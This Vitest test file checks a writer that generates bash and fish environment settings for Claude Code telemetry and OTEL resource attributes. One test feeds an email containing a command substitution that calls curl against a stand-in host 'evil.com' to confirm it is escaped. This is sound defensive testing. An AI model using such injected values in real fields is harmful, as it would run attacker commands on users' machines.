import { describe, it, expect } from "vitest";
import { generateEnvContent, generateFishContent } from "../../../src/claude-code/config/writer.js";
import type { ClaudeCodeConfig } from "../../../src/claude-code/config/loader.js";

/** Minimal valid config with only required fields. */
const minimalConfig: ClaudeCodeConfig = {
  apiKey: "hak_testkey123",
  endpoint: "https://api.revenium.ai",
};

/** Fully populated config covering all optional fields. */
const fullConfig: ClaudeCodeConfig = {
  apiKey: "hak_fullkey456",
  endpoint: "https://api.revenium.ai",
  email: "user@example.com",
  subscriptionTier: "pro",
  organizationName: "Acme Corp",
  productName: "Widget API",
  extraUsageEnabled: true,
};

describe("generateEnvContent — all fields populated", () => {
  it("includes CLAUDE_CODE_SUBSCRIPTION", () => {
    const output = generateEnvContent(fullConfig);
    expect(output).toContain("export CLAUDE_CODE_SUBSCRIPTION=");
    expect(output).toContain('"pro"');
  });

  it("includes CLAUDE_CODE_SUBSCRIPTION_TIER", () => {
    const output = generateEnvContent(fullConfig);
    expect(output).toContain("export CLAUDE_CODE_SUBSCRIPTION_TIER=");
    expect(output).toContain('"pro"');
  });

  it("includes REVENIUM_SUBSCRIBER_EMAIL", () => {
    const output = generateEnvContent(fullConfig);
    expect(output).toContain("export REVENIUM_SUBSCRIBER_EMAIL=");
    expect(output).toContain('"user@example.com"');
  });

  it("includes CLAUDE_CODE_EXTRA_USAGE_ENABLED=1 when extraUsageEnabled is true", () => {
    const output = generateEnvContent(fullConfig);
    expect(output).toContain("export CLAUDE_CODE_EXTRA_USAGE_ENABLED=1");
  });

  it("includes organization.name in OTEL_RESOURCE_ATTRIBUTES", () => {
    const output = generateEnvContent(fullConfig);
    expect(output).toContain("organization.name=Acme Corp");
  });

  it("includes product.name in OTEL_RESOURCE_ATTRIBUTES", () => {
    const output = generateEnvContent(fullConfig);
    expect(output).toContain("product.name=Widget API");
  });

  it("includes user.email in OTEL_RESOURCE_ATTRIBUTES", () => {
    const output = generateEnvContent(fullConfig);
    expect(output).toContain("user.email=user@example.com");
  });

  it("includes CLAUDE_CODE_SUBSCRIPTION_TIER in OTEL_RESOURCE_ATTRIBUTES", () => {
    const output = generateEnvContent(fullConfig);
    expect(output).toContain("CLAUDE_CODE_SUBSCRIPTION_TIER=pro");
  });
});

describe("generateEnvContent — no cost_multiplier anywhere", () => {
  it("does not include cost_multiplier in output for full config", () => {
    const output = generateEnvContent(fullConfig);
    expect(output).not.toContain("cost_multiplier");
  });

  it("does not include COST_MULTIPLIER env var", () => {
    const output = generateEnvContent(fullConfig);
    expect(output).not.toContain("COST_MULTIPLIER");
  });

  it("does not include cost_multiplier in minimal config output", () => {
    const output = generateEnvContent(minimalConfig);
    expect(output).not.toContain("cost_multiplier");
  });
});

describe("generateEnvContent — user.email in OTEL_RESOURCE_ATTRIBUTES", () => {
  it("includes user.email when email is set alongside tier", () => {
    const config: ClaudeCodeConfig = {
      ...minimalConfig,
      email: "user@example.com",
      subscriptionTier: "max_5x",
    };
    const output = generateEnvContent(config);
    expect(output).toContain("OTEL_RESOURCE_ATTRIBUTES");
    expect(output).toContain("user.email=user@example.com");
  });

  it("includes user.email in OTEL_RESOURCE_ATTRIBUTES when only email is set (no tier)", () => {
    const config: ClaudeCodeConfig = {
      ...minimalConfig,
      email: "solo@example.com",
    };
    const output = generateEnvContent(config);
    expect(output).toContain("OTEL_RESOURCE_ATTRIBUTES");
    expect(output).toContain("user.email=solo@example.com");
  });

  it("does not include OTEL_RESOURCE_ATTRIBUTES when neither email nor tier is set", () => {
    const output = generateEnvContent(minimalConfig);
    expect(output).not.toContain("OTEL_RESOURCE_ATTRIBUTES");
  });
});

describe("generateEnvContent — tier-only (no email)", () => {
  it("writes OTEL_RESOURCE_ATTRIBUTES when subscriptionTier is set without email", () => {
    const config: ClaudeCodeConfig = {
      ...minimalConfig,
      subscriptionTier: "pro",
      organizationName: "TestOrg",
    };
    const output = generateEnvContent(config);
    expect(output).toContain("OTEL_RESOURCE_ATTRIBUTES");
    expect(output).toContain("organization.name=TestOrg");
  });
});

describe("generateEnvContent — EXTRA_USAGE_ENABLED", () => {
  it("writes CLAUDE_CODE_EXTRA_USAGE_ENABLED=1 when extraUsageEnabled is true", () => {
    const config: ClaudeCodeConfig = { ...minimalConfig, extraUsageEnabled: true };
    const output = generateEnvContent(config);
    expect(output).toContain("export CLAUDE_CODE_EXTRA_USAGE_ENABLED=1");
  });

  it("writes CLAUDE_CODE_EXTRA_USAGE_ENABLED=0 when extraUsageEnabled is false", () => {
    const config: ClaudeCodeConfig = { ...minimalConfig, extraUsageEnabled: false };
    const output = generateEnvContent(config);
    expect(output).toContain("export CLAUDE_CODE_EXTRA_USAGE_ENABLED=0");
  });

  it("omits CLAUDE_CODE_EXTRA_USAGE_ENABLED when extraUsageEnabled is undefined", () => {
    const output = generateEnvContent(minimalConfig);
    expect(output).not.toContain("CLAUDE_CODE_EXTRA_USAGE_ENABLED");
  });
});

describe("generateEnvContent — minimal config", () => {
  it("includes telemetry enabled, endpoint, headers, protocol, logs exporter", () => {
    const output = generateEnvContent(minimalConfig);
    expect(output).toContain("export CLAUDE_CODE_ENABLE_TELEMETRY=1");
    expect(output).toContain("export OTEL_EXPORTER_OTLP_ENDPOINT=");
    expect(output).toContain("export OTEL_EXPORTER_OTLP_HEADERS=");
    expect(output).toContain("export OTEL_EXPORTER_OTLP_PROTOCOL=http/json");
    expect(output).toContain("export OTEL_LOGS_EXPORTER=otlp");
  });

  it("does not include subscription, email, or OTEL_RESOURCE_ATTRIBUTES", () => {
    const output = generateEnvContent(minimalConfig);
    expect(output).not.toContain("CLAUDE_CODE_SUBSCRIPTION");
    expect(output).not.toContain("REVENIUM_SUBSCRIBER_EMAIL");
    expect(output).not.toContain("OTEL_RESOURCE_ATTRIBUTES");
  });
});

describe("generateEnvContent — shell metacharacters in OTEL_RESOURCE_ATTRIBUTES", () => {
  it("escapes dollar signs in organization name", () => {
    const config: ClaudeCodeConfig = {
      ...minimalConfig,
      subscriptionTier: "pro",
      organizationName: "Org$Corp",
    };
    const output = generateEnvContent(config);
    expect(output).toContain("organization.name=Org%24Corp");
    expect(output).not.toContain("organization.name=Org$Corp");
  });

  it("escapes backticks in product name", () => {
    const config: ClaudeCodeConfig = {
      ...minimalConfig,
      subscriptionTier: "pro",
      productName: "prod`test`",
    };
    const output = generateEnvContent(config);
    expect(output).toContain("product.name=prod%60test%60");
    expect(output).not.toContain("product.name=prod`test`");
  });

  it("escapes backslashes in email", () => {
    const config: ClaudeCodeConfig = {
      ...minimalConfig,
      email: "user\\evil@example.com",
    };
    const output = generateEnvContent(config);
    expect(output).toContain("user.email=user%5Cevil@example.com");
  });

  it("neutralizes command substitution in email within OTEL_RESOURCE_ATTRIBUTES", () => {
    const config: ClaudeCodeConfig = {
      ...minimalConfig,
      email: "attacker$(curl evil.com)@example.com",
    };
    const output = generateEnvContent(config);
    const otelLine = output.split("\n").find((l) => l.includes("OTEL_RESOURCE_ATTRIBUTES"));
    expect(otelLine).toContain("user.email=attacker%24(curl evil.com)@example.com");
    expect(otelLine).not.toContain("$(curl");
  });
});

describe("generateFishContent — mirrors bash content semantically", () => {
  it("uses set -gx instead of export for TELEMETRY_ENABLED", () => {
    const output = generateFishContent(fullConfig);
    expect(output).toContain("set -gx CLAUDE_CODE_ENABLE_TELEMETRY 1");
    expect(output).not.toContain("export CLAUDE_CODE_ENABLE_TELEMETRY");
  });

  it("includes CLAUDE_CODE_SUBSCRIPTION with fish syntax", () => {
    const output = generateFishContent(fullConfig);
    expect(output).toContain("set -gx CLAUDE_CODE_SUBSCRIPTION");
  });

  it("includes CLAUDE_CODE_SUBSCRIPTION_TIER with fish syntax", () => {
    const output = generateFishContent(fullConfig);
    expect(output).toContain("set -gx CLAUDE_CODE_SUBSCRIPTION_TIER");
  });

  it("includes user.email in OTEL_RESOURCE_ATTRIBUTES", () => {
    const output = generateFishContent(fullConfig);
    expect(output).toContain("user.email=user@example.com");
  });

  it("includes CLAUDE_CODE_SUBSCRIPTION_TIER in OTEL_RESOURCE_ATTRIBUTES", () => {
    const output = generateFishContent(fullConfig);
    expect(output).toContain("CLAUDE_CODE_SUBSCRIPTION_TIER=pro");
  });

  it("includes organization.name in OTEL_RESOURCE_ATTRIBUTES", () => {
    const output = generateFishContent(fullConfig);
    expect(output).toContain("organization.name=Acme Corp");
  });

  it("includes product.name in OTEL_RESOURCE_ATTRIBUTES", () => {
    const output = generateFishContent(fullConfig);
    expect(output).toContain("product.name=Widget API");
  });

  it("writes CLAUDE_CODE_EXTRA_USAGE_ENABLED=1 with fish syntax", () => {
    const output = generateFishContent(fullConfig);
    expect(output).toContain("set -gx CLAUDE_CODE_EXTRA_USAGE_ENABLED 1");
  });

  it("writes CLAUDE_CODE_EXTRA_USAGE_ENABLED=0 when false", () => {
    const config: ClaudeCodeConfig = { ...minimalConfig, extraUsageEnabled: false };
    const output = generateFishContent(config);
    expect(output).toContain("set -gx CLAUDE_CODE_EXTRA_USAGE_ENABLED 0");
  });

  it("omits CLAUDE_CODE_EXTRA_USAGE_ENABLED when undefined", () => {
    const output = generateFishContent(minimalConfig);
    expect(output).not.toContain("CLAUDE_CODE_EXTRA_USAGE_ENABLED");
  });

  it("does not include cost_multiplier", () => {
    const output = generateFishContent(fullConfig);
    expect(output).not.toContain("cost_multiplier");
  });

  it("includes user.email in OTEL_RESOURCE_ATTRIBUTES when only email is set (no tier)", () => {
    const config: ClaudeCodeConfig = {
      ...minimalConfig,
      email: "solo@example.com",
    };
    const output = generateFishContent(config);
    expect(output).toContain("OTEL_RESOURCE_ATTRIBUTES");
    expect(output).toContain("user.email=solo@example.com");
  });
});
